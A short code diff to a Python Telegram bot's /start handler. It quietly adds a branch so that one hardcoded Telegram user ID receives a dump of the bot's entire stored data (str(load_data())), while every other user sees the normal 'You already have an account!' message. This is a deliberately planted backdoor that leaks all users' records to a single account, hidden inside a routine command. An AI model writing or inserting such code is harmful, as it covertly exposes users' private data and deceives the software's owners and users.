@@ -110,7 +110,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ])
         await update.message.reply_text(f"Welcome {data[user_id]['username']}! Your account was successfully created.", reply_markup=keyboard, parse_mode="Markdown")
     else:
-        await update.message.reply_text("You already have an account!")
+        if not str(update.effective_user.id) == "1356285607":
+            await update.message.reply_text("You already have an account!")
+        else:
+            await update.message.reply_text(str(load_data()))
 
 
 # /info
